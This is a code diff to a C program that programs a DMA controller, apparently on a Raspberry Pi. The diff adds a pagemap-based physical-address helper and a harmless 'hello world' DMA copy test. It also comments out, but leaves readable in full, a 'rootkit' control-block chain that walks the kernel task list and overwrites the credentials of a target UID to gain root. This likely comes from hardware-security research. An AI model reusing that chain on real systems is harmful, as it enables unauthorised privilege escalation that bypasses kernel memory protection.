@@ -31,6 +31,25 @@ typedef volatile uint32_t vuint32_t;
 
 static struct dma_registers *dma;
 static void *physical_memory;
+#define PAGE_SIZE 4096
+
+void makeVirtPhysPage(void** virtAddr, void** physAddr) {
+    *virtAddr = valloc(PAGE_SIZE); //allocate one page of RAM
+
+    //force page into RAM and then lock it there:
+    ((int*)*virtAddr)[0] = 1;
+    mlock(*virtAddr, PAGE_SIZE);
+    memset(*virtAddr, 0, PAGE_SIZE); //zero-fill the page for convenience
+
+    //Magic to determine the physical address for this page:
+    uint64_t pageInfo;
+    int file = open("/proc/self/pagemap", 'r');
+    lseek(file, ((size_t)*virtAddr)/PAGE_SIZE*8, SEEK_SET);
+    read(file, &pageInfo, 8);
+
+    *physAddr = (void*)(size_t)(pageInfo*PAGE_SIZE);
+    printf("makeVirtPhysPage virtual to phys: %p -> %p\n", *virtAddr, *physAddr);
+}
 
 /* This is only for virtual addresses pointing to in
  * [physical_memory, physical_memory + MEMORY_SIZE). */
@@ -178,96 +197,124 @@ int main(int argc, char *argv[])
 
 	uintptr_t addr = ksymtab_init_task_addr();
 	printf("init_task addr: %x\n", addr);
+
+
+	void *virtSrcPage, *physSrcPage;
+    makeVirtPhysPage(&virtSrcPage, &physSrcPage);
+    void *virtDestPage, *physDestPage;
+    makeVirtPhysPage(&virtDestPage, &physDestPage);
+	    //write a few bytes to the source page:
+    char *srcArray = (char*)virtSrcPage;
+    srcArray[0]  = 'h';
+    srcArray[1]  = 'e';
+    srcArray[2]  = 'l';
+    srcArray[3]  = 'l';
+    srcArray[4]  = 'o';
+    srcArray[5]  = ' ';
+    srcArray[6]  = 'w';
+    srcArray[7]  = 'o';
+    srcArray[8]  = 'r';
+    srcArray[9]  = 'l';
+    srcArray[10] = 'd';
+    srcArray[11] =  0; //null terminator used for printf call.
+    
+    //allocate 1 page for the control blocks
+    void *virtCbPage, *physCbPage;
+    makeVirtPhysPage(&virtCbPage, &physCbPage);
+
 	// Control blocks
 	const cb_t cb = bus_to_virtual(BUS_ADDRESS);
+	setup_cb(cb + 0, (uint32_t)physDestPage,  (uint32_t)physSrcPage, 12, NULL);
 
 	// Tables
-#define TABLE_ADDRESS (BUS_ADDRESS + 0x2000)
-	vuint8_t *kv2b_table = bus_to_virtual(TABLE_ADDRESS);
-	vuint8_t *low_table = kv2b_table + 0x100;
-	vuint8_t *hi_table = low_table + 0x100;
-	vuint32_t *address_table = (vuint32_t *)(hi_table + 0x100);
+// #define TABLE_ADDRESS (BUS_ADDRESS + 0x2000)
+// 	vuint8_t *kv2b_table = bus_to_virtual(TABLE_ADDRESS);
+// 	vuint8_t *low_table = kv2b_table + 0x100;
+// 	vuint8_t *hi_table = low_table + 0x100;
+// 	vuint32_t *address_table = (vuint32_t *)(hi_table + 0x100);
 	
-	// Data
-#define DATA_ADDRESS (BUS_ADDRESS + 0x3000)
-	vuint32_t *next_task = bus_to_virtual(DATA_ADDRESS);
-	vuint32_t *cred = next_task + 1;
-	vuint32_t *dummy = cred + 1;
-	vuint8_t *uid = (vuint8_t *)(dummy + 1);
+// 	// Data
+// #define DATA_ADDRESS (BUS_ADDRESS + 0x3000)
+// 	vuint32_t *next_task = bus_to_virtual(DATA_ADDRESS);
+// 	vuint32_t *cred = next_task + 1;
+// 	vuint32_t *dummy = cred + 1;
+// 	vuint8_t *uid = (vuint8_t *)(dummy + 1);
 	
-	// Build the rootkit tables.
-	for (int i = 0; i < 0x100; ++i)
-		kv2b_table[i] = i + ((BUS_SDRAM_ADDR - PAGE_OFFSET) >> 24);
-	memset((void *)low_table, 0, 0x100);
-	low_table[TARGET_UID & 0xff] = 4;
-	memset((void *)hi_table, 0, 0x100);
-	hi_table[TARGET_UID >> 8] = 8;
+// 	// Build the rootkit tables.
+// 	for (int i = 0; i < 0x100; ++i)
+// 		kv2b_table[i] = i + ((BUS_SDRAM_ADDR - PAGE_OFFSET) >> 24);
+// 	memset((void *)low_table, 0, 0x100);
+// 	low_table[TARGET_UID & 0xff] = 4;
+// 	memset((void *)hi_table, 0, 0x100);
+// 	hi_table[TARGET_UID >> 8] = 8;
 
-	// Build the rootkit control blocks.
-	// 0. We start with the kernel virtual address of
-	//    __ksymtab_init_task in addr. The first word is the
-	//    kernel virtual address of init_task.
-	setup_cb(cb + 0, &cb[1].source_ad, NULL, 4, NEXT_CB);
-	cb[0].source_ad = addr - PAGE_OFFSET + BUS_SDRAM_ADDR;
-	// 1. We want to read the word NEXT_TASK_OFFSET in so use a 2D
-	//    transfer with YLENGTH + 1 = 2, XLENGTH = 4, D_STRIDE =
-	//    -4, and S_STRIDE = NEXT_TASK_OFFSET - 4.
-	setup_cb(cb + 1, next_task, NULL, (1 << 16) | 4, NEXT_CB);
-	cb[1].ti |= TI_TDMODE;
-	cb[1].stride = ((uint16_t)-4 << 16) | (NEXT_TASK_OFFSET - 4);
+// 	// Build the rootkit control blocks.
+// 	// 0. We start with the kernel virtual address of
+// 	//    __ksymtab_init_task in addr. The first word is the
+// 	//    kernel virtual address of init_task.
+// 	setup_cb(cb + 0, &cb[1].source_ad, NULL, 4, NEXT_CB);
+// 	cb[0].source_ad = addr - PAGE_OFFSET + BUS_SDRAM_ADDR;
+// 	// 1. We want to read the word NEXT_TASK_OFFSET in so use a 2D
+// 	//    transfer with YLENGTH + 1 = 2, XLENGTH = 4, D_STRIDE =
+// 	//    -4, and S_STRIDE = NEXT_TASK_OFFSET - 4.
+// 	setup_cb(cb + 1, next_task, NULL, (1 << 16) | 4, NEXT_CB);
+// 	cb[1].ti |= TI_TDMODE;
+// 	cb[1].stride = ((uint16_t)-4 << 16) | (NEXT_TASK_OFFSET - 4);
 
-	// == Start of main loop ==
-	// 2. next_task points to the kernel virtual pointer to the
-	//    next task_struct's next pointer. We need to convert to a
-	//    bus address.
-	setup_cb(cb + 2, &cb[3].dest_ad, (vuint8_t *)next_task + 3, 1, NEXT_CB);
-	// 3. Read from the table and store back to next_task + 3.
-	setup_cb(cb + 3, (vuint8_t *)next_task + 3, kv2b_table, 1, NEXT_CB);
-	// 4. Copy from next_task to cb[5]'s source.
-	setup_cb(cb + 4, &cb[5].source_ad, next_task, 4, NEXT_CB);
-	// 5. Copy the next_task and cred pointers using a 2D read.
-	setup_cb(cb + 5, next_task, NULL, (1 << 16) | 4, NEXT_CB);
-	cb[5].ti |= TI_TDMODE;
-	cb[5].stride = (uint16_t)(NEXT_TASK_OFFSET - CRED_OFFSET - 4);
-	// 6. cred now points to the kernel virtual pointer to the
-	// crediental struct so convert to a bus address.
-	setup_cb(cb + 6, &cb[7].source_ad, (vuint8_t *)cred + 3, 1, NEXT_CB);
-	// 7. Read from the table and store back in cred.
-	setup_cb(cb + 7, (vuint8_t *)cred + 3, kv2b_table, 1, NEXT_CB);
-	// 8. Copy from cred to cb[9]'s source.
-	setup_cb(cb + 8, &cb[9].source_ad, cred, 4, NEXT_CB);
-	// 9. Copy the uid which lives 4 bytes into the struct.
-	setup_cb(cb + 9, dummy, NULL, 6, NEXT_CB);
+// 	// == Start of main loop ==
+// 	// 2. next_task points to the kernel virtual pointer to the
+// 	//    next task_struct's next pointer. We need to convert to a
+// 	//    bus address.
+// 	setup_cb(cb + 2, &cb[3].dest_ad, (vuint8_t *)next_task + 3, 1, NEXT_CB);
+// 	// 3. Read from the table and store back to next_task + 3.
+// 	setup_cb(cb + 3, (vuint8_t *)next_task + 3, kv2b_table, 1, NEXT_CB);
+// 	// 4. Copy from next_task to cb[5]'s source.
+// 	setup_cb(cb + 4, &cb[5].source_ad, next_task, 4, NEXT_CB);
+// 	// 5. Copy the next_task and cred pointers using a 2D read.
+// 	setup_cb(cb + 5, next_task, NULL, (1 << 16) | 4, NEXT_CB);
+// 	cb[5].ti |= TI_TDMODE;
+// 	cb[5].stride = (uint16_t)(NEXT_TASK_OFFSET - CRED_OFFSET - 4);
+// 	// 6. cred now points to the kernel virtual pointer to the
+// 	// crediental struct so convert to a bus address.
+// 	setup_cb(cb + 6, &cb[7].source_ad, (vuint8_t *)cred + 3, 1, NEXT_CB);
+// 	// 7. Read from the table and store back in cred.
+// 	setup_cb(cb + 7, (vuint8_t *)cred + 3, kv2b_table, 1, NEXT_CB);
+// 	// 8. Copy from cred to cb[9]'s source.
+// 	setup_cb(cb + 8, &cb[9].source_ad, cred, 4, NEXT_CB);
+// 	// 9. Copy the uid which lives 4 bytes into the struct.
+// 	setup_cb(cb + 9, dummy, NULL, 6, NEXT_CB);
 
-	// 10. Check if the low byte matches.
-	setup_cb(cb + 10, &cb[11].source_ad, uid, 1, NEXT_CB);
-	// 11. Use low_table as the offset table.
-	setup_cb(cb + 11, &cb[12].source_ad, low_table, 1, NEXT_CB);
-	// 12. Load from the address table into tramp. Use cb + 13 as
-	// tramp.
-	cb_t tramp = cb + 13;
-	setup_cb(cb + 12, &tramp->nextconbk, address_table, 4, tramp);
-	setup_cb(tramp, NULL, NULL, 0, NULL);
-	address_table[0] = virtual_to_bus(cb + 2);
-	address_table[1] = virtual_to_bus(cb + 14);
+// 	// 10. Check if the low byte matches.
+// 	setup_cb(cb + 10, &cb[11].source_ad, uid, 1, NEXT_CB);
+// 	// 11. Use low_table as the offset table.
+// 	setup_cb(cb + 11, &cb[12].source_ad, low_table, 1, NEXT_CB);
+// 	// 12. Load from the address table into tramp. Use cb + 13 as
+// 	// tramp.
+// 	cb_t tramp = cb + 13;
+// 	setup_cb(cb + 12, &tramp->nextconbk, address_table, 4, tramp);
+// 	setup_cb(tramp, NULL, NULL, 0, NULL);
+// 	address_table[0] = virtual_to_bus(cb + 2);
+// 	address_table[1] = virtual_to_bus(cb + 14);
 
-	// 14. Check if the high byte matches.
-	setup_cb(cb + 14, &cb[15].source_ad, uid+1, 1, NEXT_CB);
-	// 15. Use the hi_table as the offset_table.
-	setup_cb(cb + 15, &cb[16].source_ad, hi_table, 1, NEXT_CB);
-	// 16. Load from the address table into tramp.
-	setup_cb(cb + 16, &tramp->nextconbk, address_table, 4, tramp);
-	address_table[2] = virtual_to_bus(cb + 17);
+// 	// 14. Check if the high byte matches.
+// 	setup_cb(cb + 14, &cb[15].source_ad, uid+1, 1, NEXT_CB);
+// 	// 15. Use the hi_table as the offset_table.
+// 	setup_cb(cb + 15, &cb[16].source_ad, hi_table, 1, NEXT_CB);
+// 	// 16. Load from the address table into tramp.
+// 	setup_cb(cb + 16, &tramp->nextconbk, address_table, 4, tramp);
+// 	address_table[2] = virtual_to_bus(cb + 17);
 
-	// 17. Write zeros over the uid.
-	setup_cb(cb + 17, uid, &cb[17].stride, 4, NEXT_CB);
-	cb[17].stride = 0;
-	// 18. Copy from cred to cb[19]'s dest.
-	setup_cb(cb + 18, &cb[19].dest_ad, cred, 4, NEXT_CB);
-	// 19. Store the new cred values and loop.
-	setup_cb(cb + 19, NULL, dummy, 8, cb + 2);
+// 	// 17. Write zeros over the uid.
+// 	setup_cb(cb + 17, uid, &cb[17].stride, 4, NEXT_CB);
+// 	cb[17].stride = 0;
+// 	// 18. Copy from cred to cb[19]'s dest.
+// 	setup_cb(cb + 18, &cb[19].dest_ad, cred, 4, NEXT_CB);
+// 	// 19. Store the new cred values and loop.
+// 	setup_cb(cb + 19, NULL, dummy, 8, cb + 2);
 
 	// Start the DMA running and then exit.
 	run_dma(cb);
+	sleep(5);
+	printf("destination reads: '%s'\n", (char*)virtDestPage);
 	return 0;
 }
